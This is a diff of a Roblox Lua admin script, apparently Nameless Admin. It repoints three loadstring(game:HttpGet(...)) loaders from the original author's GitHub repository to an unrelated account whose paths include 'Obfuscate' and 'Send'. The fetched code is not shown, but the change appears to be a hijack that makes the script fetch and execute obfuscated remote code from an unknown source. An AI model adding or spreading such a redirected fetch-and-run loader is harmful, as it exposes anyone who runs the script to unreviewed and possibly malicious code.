@@ -79,9 +79,9 @@ if not game:IsLoaded() then
 end
 local loader=''
 if getgenv().NATestingVer then
-	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NA%20testing.lua"))();]]
+	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/main/Send/.txt/SWTTIN1"))();]]
 else
-	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))();]]
+	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/main/Lua/Obfuscate/Nameless"))();]]
 end
 
 NACaller(function()
@@ -98,7 +98,7 @@ local Notification=nil
 
 repeat 
 	local s,r=pcall(function()
-		return loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NamelessAdminNotifications.lua"))()
+		return loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/main/Send/.txt/NotifRest.txt"))()
 	end);
 
 	if s then
